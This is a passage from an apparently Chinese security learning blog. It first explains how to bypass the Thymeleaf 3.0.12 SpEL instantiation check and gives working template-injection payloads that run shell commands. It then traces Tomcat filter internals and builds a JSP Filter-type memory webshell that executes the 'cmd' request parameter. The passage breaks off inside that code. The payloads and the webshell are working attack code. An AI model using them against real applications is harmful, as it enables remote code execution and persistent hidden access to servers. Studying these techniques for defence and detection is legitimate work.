<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105182319525.png" alt="image-20221105182319525"></p>
<p>在这里通过正则匹配到__  __包裹的内容</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105182858029.png" alt="image-20221105182858029"></p>
<p>最后执行的时候会被还原成一个标准的spel表达式</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105183035030.png" alt="image-20221105183035030"></p>
<p><strong>以上逻辑仅限于Thymeleaf 3.0-3.0.12(不含3.0.12)</strong>     </p>
<h2 id="Thymeleaf-3-0-12"><a href="#Thymeleaf-3-0-12" class="headerlink" title="Thymeleaf 3.0.12"></a>Thymeleaf 3.0.12</h2><p>在3.0.12版本发布了一个补丁</p>
<p>其新增了一个这样的函数,当调用表达式的时候，会经过该函数的判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">containsSpELInstantiationOrStatic</span><span class="params">(<span class="keyword">final</span> String expression)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> explen = expression.length();</span><br><span class="line">        <span class="keyword">int</span> n = explen;</span><br><span class="line">        <span class="keyword">int</span> ni = <span class="number">0</span>; <span class="comment">// index for computing position in the NEW_ARRAY</span></span><br><span class="line">        <span class="keyword">int</span> si = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">while</span> (n-- != <span class="number">0</span>) &#123;</span><br><span class="line">            c = expression.charAt(n);</span><br><span class="line">            <span class="keyword">if</span> (ni &lt; NEW_LEN</span><br><span class="line">                    &amp;&amp; c == NEW_ARRAY[ni]</span><br><span class="line">                    &amp;&amp; (ni &gt; <span class="number">0</span> || ((n + <span class="number">1</span> &lt; explen) &amp;&amp; Character.isWhitespace(expression.charAt(n + <span class="number">1</span>))))) &#123;</span><br><span class="line">                ni++;</span><br><span class="line">                <span class="keyword">if</span> (ni == NEW_LEN &amp;&amp; (n == <span class="number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="number">1</span>)))) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>; <span class="comment">// we found an object instantiation</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ni &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                n += ni;</span><br><span class="line">                ni = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (si &lt; n) &#123;</span><br><span class="line">                    <span class="comment">// This has to be restarted too</span></span><br><span class="line">                    si = -<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ni = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                si = n;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (si &gt; n &amp;&amp; c == <span class="string">&#x27;(&#x27;</span></span><br><span class="line">                        &amp;&amp; ((n - <span class="number">1</span> &gt;= <span class="number">0</span>) &amp;&amp; (expression.charAt(n - <span class="number">1</span>) == <span class="string">&#x27;T&#x27;</span>))</span><br><span class="line">                        &amp;&amp; ((n - <span class="number">1</span> == <span class="number">0</span>) || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="number">2</span>)))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (si &gt; n &amp;&amp; !(Character.isJavaIdentifierPart(c) || c == <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                si = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到其主要逻辑是首先 倒序检测是否包含 <code>wen</code>关键字、在<code>(</code>的左边的字符是否是<code>T</code>，如包含，那么认为找到了一个实例化对象，返回<code>true</code>，阻止该表达式的执行。</p>
<p>因此要绕过这个函数，只要满足三点：<br>1、表达式中不能含有关键字<code>new</code><br>2、在<code>(</code>的左边的字符不能是<code>T</code><br>3、不能在<code>T</code>和<code>(</code>中间添加的字符使得原表达式出现问题</p>
<p>三梦师傅给出的答案是%20(空格)，在copanda的研究中发现其实还有%0a(换行)、%09(制表符)，此外，通过 fuzzing 同样可以找到很多可以利用的字符</p>
<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">home/__$&#123;new java.util.Scanner(T (java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>

<h4 id="当视图名与当前path一致的时候"><a href="#当视图名与当前path一致的时候" class="headerlink" title="当视图名与当前path一致的时候"></a>当视图名与当前path一致的时候</h4><p>就是类似这样</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105185826610.png" alt="image-20221105185826610"></p>
<p>那么就会经过<code>SpringRequestUtils.java</code>中的<code>checkViewNameNotInRequest</code>函数检测</p>
<h5 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h5><h6 id="1-两个"><a href="#1-两个" class="headerlink" title="1.两个/"></a>1.两个/</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user//__$&#123;new java.util.Scanner(T (java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>

<h6 id="2-分号"><a href="#2-分号" class="headerlink" title="2.分号"></a>2.分号</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user/;__$&#123;new java.util.Scanner(T (java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>-- java -- thymeleaf</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat内存马学习</title>
    <url>/2022/04/17/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p>参考引用</p>
<p><a href="https://javasec.org/javaweb/MemoryShell">https://javasec.org/javaweb/MemoryShell</a></p>
</blockquote>
<h2 id="Filter型内存马"><a href="#Filter型内存马" class="headerlink" title="Filter型内存马"></a>Filter型内存马</h2><h5 id="调试前的准备"><a href="#调试前的准备" class="headerlink" title="调试前的准备"></a>调试前的准备</h5><p>首先配置环境和调试用的代码</p>
<p>新建java-web maven项目,在pom.xml中导入对应依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--Servlet 依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--JSP依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--JSTL表达式的依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--standard标签库--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>接着在filter处打断点,debug,但是出现了无法在此处step into的问题,和之前一样,去下载tomcat的源码给sourcepath中添加tomcat源码目录,调试的时候能正常进入,但是有很多报红,并不影响代码跟进调试,之后再解决这个问题</p>
<p>好吧,我是儍狗,原来maven可以直接导入tomcat依赖然后下载源码……</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.58<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>接下来跟进到代码,跟进filter的代码流程</p>
</blockquote>
<p>首先进入doFilter方法中,会直接进入<code>internalDoFilter()</code>方法中,这个才是Tomcat中真正实现过滤的类</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220417184815764.png" alt="image-20220417184815764"></p>
<p>当到最后一个Filter,就会调用对应servlet的service方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220417185013757.png" alt="image-20220417185013757"></p>
<p>总而言之,所有Filter就是一条独木桥上面的木板,少了哪一块都会导致后面的Filter的doFilter方法调用不到从而导致调用不到对应Servlet的service方法</p>
<p>在tomcat的组成中,一部分为服务器用于与外界交流,一部分是容器,里面运行的就是servlet,filter….</p>
<h5 id="tomcat和servlet的关系"><a href="#tomcat和servlet的关系" class="headerlink" title="tomcat和servlet的关系"></a>tomcat和servlet的关系</h5><p>Tomcat将http请求文本接收并解析,然后封装成HttpServletResquest类型的request对象,</p>
<p>servlet将要响应的信息封装成HttpServletResponse对象给tomcat,tomcat就会将其编程响应文本的格式发送给浏览器</p>
<h4 id="容器组件Container"><a href="#容器组件Container" class="headerlink" title="容器组件Container"></a>容器组件Container</h4><p> 容器代表一类组件，这类组件的作用就是接收客户端请求并返回响应数据，具体操作委派到子组件完成。</p>
<p>​    Engine、Host、Context、Wrapper均继承自Container</p>
<p>Tomcat中的Container用于封装和管理Servlet,以及具体处理Request请求,在Container中包含了四个子容器</p>
<h5 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h5><p>​        最顶层容器组件,其下可以包含多个Host</p>
<p>实现类为<code>org.apache.catalina.core.StandardEngine</code></p>
<h5 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h5><pre><code>     为了提供对多个域名的服务，我们可以将每个域名视为一个虚拟的主机。在每个Host下包含多个Context
</code></pre>
<p>实现类为<code>org.apache.catalina.core.StandardHost</code></p>
<h5 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h5><p>​        一个Context代表一个Web应用,其下可以包含多个Wrapper</p>
<p>实现类为<code>org.apache.catalina.core.StandardContext</code></p>
<h5 id="Wrapper"><a href="#Wrapper" class="headerlink" title="Wrapper"></a>Wrapper</h5><p>​        一个Wrapper代表一个Servlet</p>
<p>实现类为<code>org.apache.catalina.core.StandardWrapper</code></p>
<p>总而言之,Host是主机,Context是web应用,wrapper是servlet</p>
<h5 id="一些会用到的类"><a href="#一些会用到的类" class="headerlink" title="一些会用到的类"></a>一些会用到的类</h5><p>FilterDefs:</p>
<p>存放FilterDef的数组,,FilterDef中存放这过滤器名,过滤器实例,作用url等基本信息,(调试的时候没找到作用url的成员变量)</p>
<p>FilterConfigs:存放FilterConfig的数组,FilterConfig主要存放FilterDef和Filter对象等信息</p>
<p>FilterMaps:存放FilterMap数组,在FilterMap中主要存放了FilterName和对应的URLPattern    </p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418151626862.png" alt="image-20220418151626862" style="zoom:50%;" />

<p>FilterChain: 过滤器链,该对象上的doFilter方法能依次调用链上的Filter</p>
<p>StandardContext: Context接口的标准实现类,一个Context代表一个Web应用,其下可以包含多个Wrapper(servlet)</p>
<p>StandardWrapperValve: 一个Wrapper的标准实现类,一个Wrapper代表一个Servlet</p>
<p>在StandardWrapperValue中会利用ApplicationFilterFactory来创建filterChain</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418152549816.png" alt="image-20220418152549816" style="zoom:67%;" />

<p>在<code>ApplicationFilterFactory</code>中的createFilterChain方法中,首先通过getParent获取当前wrapper的爹,也就是Context,然后获取到当前context中的所有filterMap,我自己写的是testFilter1和testFilter2两个</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418153140872.png" alt="image-20220418153140872" style="zoom:80%;" />

<p>接下来</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418153636868.png" alt="image-20220418153636868" style="zoom:80%;" />

<p>会对FilterMap进行遍历,如果当前请求中的url与遍历中的filterMap相对应,则把filterMap对应的FilterConfig添加到filterChain中去</p>
<p>添加完成后会调用doFilter方法</p>
<p>doFilter方法会调用internalDoFilter方法,该方法会依次从filters中取出filterConfig,调用filter的doFilter方法,从而调用到过滤器中重写的doFilter方法,触发自定义的代码</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418154301503.png" alt="image-20220418154301503" style="zoom:80%;" />



<p>要想实现动态添加filter,首先要获取到context,因为根据前面的分析,filterMaps是通过context获取到的</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418155818702.png" alt="image-20220418155818702"></p>
<p>按照大佬的方法,首先web容器启动的时候会为每个web应用创建一个ServletContext对象,代表当前应用,而有一个类很特殊,就是<code>ApplicationContext</code>类,它是ServletContext的实现类,并且它的成员变量中包含了<code>context</code>的标准实现类<code>StandardContext</code></p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418160009434.png" alt="image-20220418160009434" style="zoom:67%;" />

<p>可以通过反射来获取到它的这个成员变量,即为当前的context,然后就可以添加filterMaps,进行一系列操作了</p>
<p>获取到context后,就可以进行动态注入filter了,但是注入之前要明确注入的参数,注入内存马实际上是在模拟写xml文件的过程</p>
<p>filterDefs存放了filter的定义,对应的类和名称就相当于web.xml中这部分代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter1<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.test.filter.testFilter1<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>filterMaps存放了filter的路径和对应filter的对应关系,还暗含了filter的调用顺序,相当于这部分代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter1<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>FilterConfigs</p>
<p>存放了FilterConfig数组,在FilterConfig中主要存放FilterDef和Filter对象的信息,调用的时候就是从这里面获取的filter</p>
<p>这里不得不提到一点,就是getClass方法得到的其实是能代表当前对象真正运行的类(Class)的对象</p>
<p>翻译的有点奇怪….,反正就是注意声明类型和实际类型的问题</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420112130648.png" alt="image-20220420112130648"></p>
<p>ServletContext接口当前正在运行的对象所对应的类就是ApplicationContextFacade</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418232736182.png" alt="image-20220418232736182"></p>
<p>而这个类中的Context的类型是ApplicationContext</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418233017639.png" alt="image-20220418233017639"></p>
<p><code>ApplicationContext</code>中有<code>StandardContext</code>类型的成员变量<code>context</code>,通过这样就能获取到对应的<code>context</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">//这里获取到的class是ApplicationContextFacade</span><br><span class="line">    appctx.setAccessible(true);</span><br><span class="line">        // ApplicationContext 为 ServletContext 的实现类</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    stdctx.setAccessible(true);</span><br><span class="line">        // standardContext为context接口标准实现类</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>

<h4 id="添加filter到当前context"><a href="#添加filter到当前context" class="headerlink" title="添加filter到当前context"></a>添加filter到当前context</h4><p>根据之前学习的相关参数包含顺序,由内到位依次创建</p>
<p>首先创建filterDef,包含filter的类和名称等信息</p>
<p>并添加到当前context中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FilterDef filterDef=<span class="keyword">new</span> FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure>



<p>接着创建filterMap,里面包含filter名称和路径的映射关系</p>
<p>并添加到context中,在添加之前还需要设置filterMap的状态,一般设置成REQUEST的状态</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FilterMap filterMap=<span class="keyword">new</span> FilterMap();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"><span class="comment">//addFilterMapBefore可以将当前的filter添加到filterChain第一个</span></span><br></pre></td></tr></table></figure>



<p>在设置状态这里,</p>
<p>有一说一,学习计算机还得英语好,起初对于这段代码有点不解,点开之后看见了作者的注释,就都明白了,为什么非要设置这个东西呢,就是为了设置当前filterMap的状态,它可以用来代表filter被应用的时候的状态</p>
<p>Dispatcher本意是调度员的意思</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br></pre></td></tr></table></figure>



<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220419132233195.png" alt="image-20220419132233195" style="zoom:67%;" />

<p>最后是filterConfig这个东西了</p>
<p>filterConfig是一个接口,真正运行的它的类是ApplicationFilterConfig,所以需要新建一个ApplicationFilterConfig对象,添加到当前正在运行的context的filterConfigs中去(注意这里是复数)</p>
<p>分解成两个问题</p>
<p>1.自定义一个ApplicationFilterConfig对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationFilterConfig filterConfig=(ApplicationFilterConfig) declaredConstructor.newInstance(standardContext,filterDef);</span><br></pre></td></tr></table></figure>

<p>2.获取到filterConfigs并修改</p>
<p>filterConfigs中存的是filter名和filterConfig的Entry</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs=(Map)configs.get(standardContext);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;test&quot;</span>,filterConfig);</span><br></pre></td></tr></table></figure>



<h5 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h5><p>有了以上这些知识,就可以尝试自己写出filter型的内存马了</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//首先通过反射获取到context</span></span><br><span class="line"></span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">    Class&lt;? extends ServletContext&gt; aClass = servletContext.getClass();</span><br><span class="line">    Field appContext = aClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);</span><br><span class="line">    Field stdContext = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdContext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="comment">//加一个系统的判断</span></span><br><span class="line">            String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">            BufferedReader bufferedReader;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                isWin = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String len;</span><br><span class="line">                <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span 